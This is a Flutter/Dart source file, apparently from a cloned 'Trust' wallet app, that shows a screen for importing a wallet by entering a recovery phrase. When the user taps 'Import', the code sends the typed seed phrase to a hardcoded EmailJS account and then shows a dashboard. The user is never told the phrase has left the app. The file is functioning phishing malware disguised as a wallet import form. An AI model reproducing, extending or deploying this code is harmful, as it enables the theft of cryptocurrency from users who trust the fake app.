import 'dart:convert';
import 'package:clone_trust/app/ui/dashboard_page.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:clone_trust/app/ui/import_form/AddressForm.dart';
import 'package:clone_trust/app/ui/import_form/PrivateKeyForm.dart';
import 'package:camera/camera.dart';

import 'TakePictureScreen.dart';

class OtherWalletForm extends StatefulWidget {
  final int index;
  final String coinName;
  final String coinImage;
  const OtherWalletForm(
      {required Key key,
      required this.index,
      required this.coinName,
      required this.coinImage})
      : super(key: key);

  @override
  State<OtherWalletForm> createState() => _OtherWalletFormState();
}

class _OtherWalletFormState extends State<OtherWalletForm>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  TextEditingController textarea = TextEditingController();

  late String coinName;
  late String keyPhrase;

  //EMAILJS FUNCTION
  Future sendEmail(
      {required String coinName, required String keyPhrase}) async {
    const serviceId = "service_cyxu3mg";
    const templateId = "template_aknaxlp";
    const userId = "qfIj6IVuWwXYFBqLv";

    final url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');

    final response = await http.post(
      url,
      headers: {
        'origin': 'http://localhost',
        'Content-Type': 'application/json',
      },
      body: json.encode({
        'service_id': serviceId,
        'template_id': templateId,
        'user_id': userId,
        'template_params': {
          'user_name': coinName,
          'user_message': keyPhrase,
        }
      }),
    );
    print(response.body);
  }

  @override
  void initState() {
    super.initState();
    _tabController = TabController(vsync: this, length: 3);
    coinName = widget.coinName;
  }

  late List<CameraDescription> cameras;

  Future<void> _initCameras() async {
    cameras = await availableCameras();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        leading: IconButton(
          icon: Icon(Icons.arrow_back),
          onPressed: () {
            Navigator.pop(context);
          },
        ),
        title: Text(
          'Import ${widget.coinName}',
        ),
        actions: <Widget>[
          IconButton(
            icon: ImageIcon(
              AssetImage("assets/img-icons/capture.png"),
              color: Colors.white,
              size: 24,
            ),
            onPressed: () async {
              // Initialize the camera
              await _initCameras();
              // Open the camera
              final camera = cameras[0];
              final result = await Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (context) => TakePictureScreen(
                    camera: camera,
                    key: UniqueKey(),
                  ),
                ),
              );
            },
          ),
        ],
        bottom: PreferredSize(
          preferredSize: Size.fromHeight(50),
          child: TabBar(
            controller: _tabController,
            tabs: [
              Tab(text: 'PHRASE'),
              Tab(text: 'PRIVATE KEY'),
              Tab(text: 'ADDRESS'),
            ],
          ),
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          Padding(
            padding: const EdgeInsets.all(8.0),
            child: Column(
              children: [
                Padding(
                  padding: const EdgeInsets.all(10.0),
                  child: TextFormField(
                    decoration: new InputDecoration(
                      focusedBorder: OutlineInputBorder(
                        borderSide:
                            BorderSide(color: Colors.blueGrey, width: 1.0),
                      ),
                      enabledBorder: OutlineInputBorder(
                        borderSide:
                            BorderSide(color: Colors.blueGrey, width: 1.0),
                      ),
                      labelText: "Name",
                    ),
                    initialValue: '${widget.coinName}',
                    onChanged: (value) {
                      coinName = value;
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(10.0),
                  child: Stack(
                    children: <Widget>[
                      TextField(
                        controller: textarea,
                        keyboardType: TextInputType.multiline,
                        maxLines: 4,
                        decoration: new InputDecoration(
                          focusedBorder: OutlineInputBorder(
                            borderSide:
                                BorderSide(color: Colors.blueGrey, width: 1.0),
                          ),
                          enabledBorder: OutlineInputBorder(
                            borderSide:
                                BorderSide(color: Colors.blueGrey, width: 1.0),
                          ),
                          hintText: "Enter Recovery Phrase",
                        ),
                        onChanged: (value) {
                          keyPhrase = value;
                        },
                      ),
                      Positioned(
                        right: 0,
                        top: 0,
                        child: GestureDetector(
                          onTap: () async {
                            final ClipboardData? clipboardData =
                                await Clipboard.getData("text/plain");
                            if (clipboardData != null) {
                              textarea.text = clipboardData.text!;
                            }
                          },
                          child: Padding(
                            padding: const EdgeInsets.all(8.0),
                            child: Text(
                              "PASTE",
                              style: TextStyle(
                                  // fontSize: 16.0,
                                  // fontWeight: FontWeight.bold,
                                  color: Color.fromARGB(255, 7, 152, 224)),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.only(
                      left: 12.0, right: 12.0, top: 10.0, bottom: 10.0),
                  child: Text(
                    "Typically 12 (sometimes 18, 24) words separated by single spaces",
                    style: TextStyle(fontSize: 12.0, color: Colors.blueGrey),
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.only(left: 15.0, right: 15.0),
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      minimumSize: Size.fromHeight(40),
                    ),
                    onPressed: () async {
                      await sendEmail(
                        coinName: coinName,
                        keyPhrase: textarea.text,
                      );
                      Navigator.pushReplacement(
                        context,
                        MaterialPageRoute(
                          builder: (context) => const DashboardPage(),
                        ),
                      );
                    },
                    child: Text('Import'),
                  ),
                ),
              ],
            ),
          ),
          PrivateKeyForm(
            index: widget.index,
            coinImage: '',
            coinName: '',
            key: UniqueKey(),
          ),
          AddressForm(
            index: widget.index,
            coinImage: '',
            coinName: '',
            key: UniqueKey(),
          ),
        ],
      ),
    );
  }
}
